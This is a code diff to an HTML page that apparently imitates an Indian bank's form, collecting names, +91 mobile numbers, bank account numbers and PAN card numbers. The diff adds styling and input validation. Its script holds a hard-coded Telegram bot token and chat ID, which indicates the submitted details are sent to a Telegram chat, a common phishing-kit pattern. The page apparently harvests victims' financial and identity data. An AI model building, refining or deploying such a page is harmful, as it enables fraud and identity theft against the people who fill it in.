@@ -34,6 +34,26 @@
             border: 1px solid #ccc;
             color: #000000; /* Yellow text inside input fields */
             background-color: hsl(0, 11%, 93%); /* Dark background for inputs */
+            position: relative;
+        }
+
+        .form-container input:focus {
+            outline: none;
+            border: 2px solid #f4b400;
+            animation: popUp 0.3s ease-in-out;
+        }
+
+        /* PAN card number focus animation */
+        @keyframes popUp {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
         }
 
         .form-container button {
@@ -71,37 +91,6 @@
             width: 100%;
             max-height: 300px;
             object-fit: cover;
-        }
-
-        /* Text Slider Styles */
-        .slider-container {
-            background-color: hsl(0, 0%, 99%);
-            padding: 10px;
-            color: white;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .slider {
-            font-size: 24px;
-            font-weight: bold;
-            white-space: nowrap;
-            overflow: hidden;
-        }
-
-        .slider span {
-            display: inline-block;
-            padding-left: 100%;
-            animation: slide 15s linear infinite;
-        }
-
-        @keyframes slide {
-            0% {
-                transform: translateX(0);
-            }
-            100% {
-                transform: translateX(-100%);
-            }
         }
 
         /* Loading box style */
@@ -152,10 +141,10 @@
                 <input type="text" id="name" name="name" placeholder="Enter your full name" required>
 
                 <label for="mobile">Mobile Number:</label>
-                <input type="text" id="mobile" name="mobile" placeholder="Enter your mobile number" maxlength="10" required>
+                <input type="tel" id="mobile" name="mobile" placeholder="Enter your mobile number" maxlength="13" required value="+91" oninput="validateMobileNumber()">
 
                 <label for="account-number">Account Number:</label>
-                <input type="number" id="account-number" name="account-number" placeholder="Enter your account number" maxlength="16" required>
+                <input type="text" id="account-number" name="account-number" placeholder="Enter your account number" maxlength="16" required pattern="^[0-9]{10,20}$" title="Account number must contain only digits." oninput="validateAccountNumber()">
 
                 <label for="pan-card">PAN Card Number:</label>
                 <input type="text" id="pan-card" name="pan-card" placeholder="Enter your PAN Card number" maxlength="10" required>
@@ -176,10 +165,35 @@
         <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
     </footer>
 
-    <!-- JavaScript for Validation and  Notification -->
+    <!-- JavaScript for Validation and Notification -->
     <script>
         const botToken = "7302997867:AAGU5IW98_lQkdPXn5Y7lAxFEZUIP7Yo1YQ"; 
         const chatId = "-1002377802733";
+
+        // Mobile Number Validation (Only allows digits and +91)
+        function validateMobileNumber() {
+            const mobileField = document.getElementById("mobile");
+            const mobileValue = mobileField.value;
+            if (/[^0-9+]/.test(mobileValue)) {
+                alert("Mobile number can only contain digits and +.");
+                mobileField.value = mobileValue.replace(/[^0-9+]/g, ''); // Remove invalid characters
+            }
+
+            // Ensure the value starts with +91
+            if (!mobileValue.startsWith("+91")) {
+                mobileField.value = "+91"; // Reset to +91 if not present
+            }
+        }
+
+        // Account Number Validation (Only allows digits)
+        function validateAccountNumber() {
+            const accountField = document.getElementById("account-number");
+            const accountValue = accountField.value;
+            if (/[^0-9]/.test(accountValue)) {
+                alert("Account number can only contain digits.");
+                accountField.value = accountValue.replace(/[^0-9]/g, ''); // Remove invalid characters
+            }
+        }
 
         document.getElementById("submit-button").addEventListener("click", function () {
             const nameField = document.getElementById("name");
@@ -193,8 +207,8 @@
                 return;
             }
 
-            if (!mobileField.value.trim() || mobileField.value.length !== 10) {
-                alert("Please enter a valid 10-digit mobile number.");
+            if (!mobileField.value.trim() || mobileField.value.length !== 13) {
+                alert("Please enter a valid 10-digit mobile number with +91.");
                 mobileField.focus();
                 return;
             }
